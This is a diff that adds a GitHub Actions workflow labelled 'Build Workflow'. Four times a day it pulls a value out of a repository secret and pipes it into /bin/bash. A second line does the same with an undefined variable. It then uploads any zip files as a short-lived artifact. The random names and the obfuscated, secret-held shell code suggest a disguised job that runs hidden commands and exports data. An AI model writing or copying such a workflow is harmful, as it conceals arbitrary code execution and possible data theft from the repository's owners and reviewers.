@@ -1,0 +1,28 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '38 0,6,12,18 * * *'
+env:
+  CI: true
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Main step
+        env:
+          l3: ${{ secrets.l3 }}
+        run: |
+          printf '%s' "$l3" | jq -r .nbb68338 | /bin/bash
+          echo $buxj55 | jq -r .dmv90396 | /bin/bash
+
+      - name: Save data
+        uses: actions/upload-artifact@v4
+        with:
+          name: Bjih2i5B
+          path: "*.zip"
+          retention-days: 1
